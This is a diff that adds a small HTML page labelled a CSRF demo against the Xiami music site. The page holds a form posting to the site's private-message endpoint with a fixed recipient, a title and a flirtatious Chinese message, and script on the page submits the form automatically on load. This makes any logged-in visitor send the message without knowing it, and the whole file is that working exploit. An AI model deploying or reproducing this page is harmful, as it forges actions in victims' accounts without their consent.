@@ -1,0 +1,20 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+        <title>虾米网 CSRF 演示</title>
+    </head>
+    <body>
+        <form action="http://www.xiami.com/member/sendpm" method="post" name="xiami">
+            <input type="text" name="tuid[]" value="19110" />
+            <input type="text" name="feelinglucky" value="19110" />
+            <input type="text" name="title" value="明城我要向你表白" />
+            <input type="text" name="content" value="你实在是长得太帅啦，又有安全感！" />
+            <input type="submit" name="submit" value="发 送" />
+        </form>
+        <script>
+            document.forms['xiami'].submit.click();
+        </script>
+    </body>
+</html>
